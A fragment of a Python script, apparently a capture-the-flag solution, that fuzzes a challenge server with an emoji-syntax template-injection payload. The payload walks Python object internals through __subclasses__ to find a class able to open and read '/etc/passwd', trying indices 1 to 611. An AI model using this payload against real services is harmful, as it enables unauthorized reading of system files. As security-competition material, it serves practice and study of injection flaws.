...
base_url = "https://homecookeds.challs.pwnoh.io/"
...
# Define the new base payload and range for fuzzing
base_payload = """
🍴 a🍇 🍎 '__'🌭'subclasses'🌭'__'🍏🍴
🍴 b🍇 join🦀a🦞🍴
🍴 c🍇 object🥚b🍴
🍴 e🍇 🍎 '1🥚'🌭'__'🌭'class'🌭'__'🍏🍴
🥢  c🦀🦞🍎FUZZ🍏🦀'/etc/passwd'🦞🥚read🦀🦞 🥢
"""
fuzz_range = range(1, 611)  # FUZZ from 1 to 611
